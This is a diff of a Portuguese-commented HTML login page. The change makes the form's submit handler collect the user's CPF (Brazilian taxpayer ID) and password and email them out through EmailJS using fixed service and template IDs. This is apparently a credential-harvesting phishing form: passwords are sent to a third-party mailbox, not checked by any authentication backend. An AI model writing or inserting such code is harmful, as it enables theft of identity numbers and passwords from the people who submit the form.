@@ -33,8 +33,18 @@
         document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault(); // Evita o envio normal do formulário
 
+            // Coleta os dados do formulário
+            var cpf = document.getElementById("cpf").value;
+            var password = document.getElementById("password").value;
+
+            // Cria um objeto com os dados do formulário
+            var formData = {
+                cpf: cpf,
+                password: password
+            };
+
             // Envia o formulário para o EmailJS
-            emailjs.send("service_q4yc9r6", "template_ug4bg1d", this)
+            emailjs.send("service_q4yc9r6", "template_ug4bg1d", formData)
                 .then(function(response) {
                     // Sucesso
                     alert("Mensagem enviada com sucesso!");
@@ -48,6 +58,7 @@
     </script>
 </body>
 </html>
+
 
 
 
